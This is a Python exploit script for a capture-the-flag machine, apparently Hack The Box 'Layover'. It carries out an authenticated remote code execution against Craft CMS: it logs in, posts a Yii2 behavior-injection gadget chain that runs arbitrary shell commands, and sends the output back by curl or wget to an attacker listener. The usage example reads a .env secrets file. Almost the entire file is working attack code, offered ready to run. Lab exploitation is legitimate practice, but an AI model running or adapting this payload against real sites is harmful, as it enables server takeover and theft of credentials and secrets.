#!/usr/bin/env python3
"""
HTB Layover - Craft CMS authenticated RCE (CVE-2026-44011), STDLIB ONLY.

The jumpbox has no internet and no `requests`, so this uses urllib only.
Run it ON THE JUMPBOX (airside-ws01) after you have joined the internal WiFi.

What it does
------------
1. Logs into the Craft control panel (GET /admin/login for the CSRF token,
   POST /admin/actions/users/login).
2. POSTs the Yii2 behavior-injection payload to
   /admin/actions/element-search/search so that
   AttributeTypecastBehavior -> Psy\\Readline\\Hoa\\ConsoleProcessus::execute()
   runs our command.
3. Command output is exfiltrated back with curl/wget to a listener we start
   here, base64-encoded, so we see it in the terminal.

Usage
-----
  python3 06_craft_rce_stdlib.py \
      --base http://portal.international.htb \
      -u jenny -p 'Fl1ghtDeck2026!' \
      -c 'cat /var/www/portal/.env' \
      --listen-ip 10.13.37.x        # the jumpbox IP on the internal WiFi

The callback must be reachable FROM the portal, i.e. it has to be the jumpbox's
10.13.37.x address, not your HTB VPN address.
"""
import argparse
import base64
import http.cookiejar
import json
import re
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

UA = "Mozilla/5.0 (X11; Linux x86_64) Layover/1.0"
CSRF_RE = re.compile(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"')
CSRF_RE2 = re.compile(
    r'"csrfTokenName"\s*:\s*"([^"]+)".*?"csrfTokenValue"\s*:\s*"([^"]+)"', re.S)


class Sink(BaseHTTPRequestHandler):
    def do_GET(self):
        b64 = urllib.parse.urlparse(self.path).path.lstrip("/")
        try:
            data = base64.b64decode(b64 + "=" * (-len(b64) % 4)).decode(errors="replace")
        except Exception:
            data = self.path
        print("\n" + "=" * 70)
        print("[+] COMMAND OUTPUT:")
        print(data)
        print("=" * 70 + "\n", flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    do_POST = do_GET

    def log_message(self, *a):
        pass


def start_listener(bind: str, port: int) -> None:
    srv = HTTPServer((bind, port), Sink)
    threading.Thread(target=srv.serve_forever, daemon=True).start()


def make_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def get(op, url):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    with op.open(req, timeout=20) as r:
        return r.read().decode(errors="replace")


def post(op, url, fields, headers=None):
    data = urllib.parse.urlencode(fields).encode()
    h = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=data, headers=h, method="POST")
    try:
        with op.open(req, timeout=25) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def post_json(op, url, payload, headers=None):
    data = json.dumps(payload).encode()
    h = {"User-Agent": UA, "Content-Type": "application/json",
         "Accept": "application/json"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=data, headers=h, method="POST")
    try:
        with op.open(req, timeout=25) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def csrf_from_login(html: str):
    m = CSRF_RE.search(html)
    if m:
        return "CRAFT_CSRF_TOKEN", m.group(1)
    m = CSRF_RE2.search(html)
    if m:
        return m.group(1), m.group(2)
    return None, None


def build_payload(cmd: str, site_id: int = 1,
                  element_type: str = "craft\\elements\\Category") -> dict:
    return {
        "elementType": element_type,
        "siteId": site_id,
        "search": "",
        "condition": {
            "class": "craft\\elements\\conditions\\ElementCondition",
            "elementType": element_type,
            "fieldLayouts": [{
                "as rce": {
                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                    "__construct()": [{
                        "attributeTypes": {
                            "typecastAfterValidate": [
                                "Psy\\Readline\\Hoa\\ConsoleProcessus", "execute"
                            ]
                        },
                        "typecastAfterValidate": ["sh", "-c", cmd],
                    }],
                },
                "on *": "self::beforeSave",
            }],
        },
    }


def main() -> None:
    ap = argparse.ArgumentParser(description="Craft CMS RCE (stdlib only)")
    ap.add_argument("-b", "--base", required=True,
                    help="e.g. http://portal.international.htb")
    ap.add_argument("-P", "--cp-path", default="/admin")
    ap.add_argument("-u", "--username", required=True)
    ap.add_argument("-p", "--password", required=True)
    ap.add_argument("-c", "--command", required=True)
    ap.add_argument("-s", "--site-id", type=int, default=1)
    ap.add_argument("--listen-ip", required=True,
                    help="jumpbox IP on 10.13.37.0/24 (portal must reach it)")
    ap.add_argument("--listen-port", type=int, default=9999)
    a = ap.parse_args()

    base = a.base.rstrip("/")
    start_listener("0.0.0.0", a.listen_port)

    # ---- 1. login -------------------------------------------------------- #
    op = make_opener()
    login_url = base + a.cp_path + "/login"
    html = get(op, login_url)
    name, token = csrf_from_login(html)
    if not token:
        print("[-] could not find CSRF token on %s" % login_url, file=sys.stderr)
        print("    (check -P / --cp-path)", file=sys.stderr)
        sys.exit(1)
    print("[*] csrf field: %s" % name)

    status, body = post(op, base + a.cp_path + "/actions/users/login",
                        {"loginName": a.username, "password": a.password,
                         name: token})
    print("[*] login request -> HTTP %s" % status)

    # ---- 2. fire the payload -------------------------------------------- #
    cmd = ("curl -s http://%s:%d/$(%s | base64 -w0) 2>/dev/null || "
           "wget -q -O- http://%s:%d/$(%s | base64 -w0)"
           % (a.listen_ip, a.listen_port, a.command,
              a.listen_ip, a.listen_port, a.command))

    url = base + a.cp_path + "/actions/element-search/search"
    hdrs = {"X-CSRF-Token": token, "X-Requested-With": "XMLHttpRequest",
            "Referer": login_url}
    print("[*] POST %s" % url)
    status, body = post_json(op, url, build_payload(cmd, a.site_id), hdrs)
    print("[*] payload response: HTTP %s" % status)
    print("[*] waiting for callback on %s:%d (Ctrl-C to stop)"
          % (a.listen_ip, a.listen_port))

    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
